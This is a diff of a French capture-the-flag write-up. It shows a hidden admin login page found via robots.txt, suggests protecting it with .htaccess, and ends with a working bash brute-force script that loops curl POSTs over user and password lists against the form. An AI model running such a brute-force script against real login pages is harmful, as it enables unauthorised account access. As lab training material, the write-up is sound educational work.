@@ -1,5 +1,5 @@
 # Explications
-Dans la page "admin", qui est une page cachée, il y un formulaire de connexion :
+Dans la page "http://IP/admin/", qui est une page cachée, il y un formulaire de connexion :
 
 ```html
 <form action="#" method="POST"> 
@@ -8,7 +8,7 @@ Dans la page "admin", qui est une page cachée, il y un formulaire de connexion 
 	&nbsp;	<p align="center"><input type="submit" value="Login" name ="Login"></p>
 </form>
 ```
-On observe aussi la présence d'un robots.txt comprenant :
+On observe aussi la présence d'un robots.txt sur le site comprenant :
 <pre>User-agent: *
 Disallow: /whatever
 Disallow: /.hidden</pre>
@@ -35,23 +35,23 @@ Il faut proteger la page en question avec un .htaccess.
 # Bonus
 Le mot de passe et le user de cette page sont aussi trouvable en **Brute Force** avec un script shell un peu different du premier:
 ```bash
-#!/bin/bash
-url="http://192.168.1.175/admin/"
+#!/bin/sh
+url="http://$1/admin/"
 curl -s -X POST "$url" -d "username=qsdqsdq&password=qsdqsd&Login=Login" > trueone
 while IFS='' read -r user; do
 	echo "try user : $user"
 	while IFS='' read -r line; do
-		echo "try password: $line"
-		curl -s "$url" -d "username=$user&password=$line&Login=Login"> testee
-		DIFF=$(diff trueone testee)
+		echo "\ttry password: $line"
+		curl -s "$url" -d "username=$user&password=$line&Login=Login"> tested
+		DIFF=$(diff trueone tested)
 		if [ "$DIFF" != "" ]
 		then
-			cat testee | grep "flag"
+			cat tested | grep "flag"
 			echo "user is : $user\npassword is $line" >> result.txt
-			rm testee
+			rm tested
 			break
 		fi
-		rm testee
+		rm tested
 	done < "dict.txt"
 done < "users.txt"
 ```
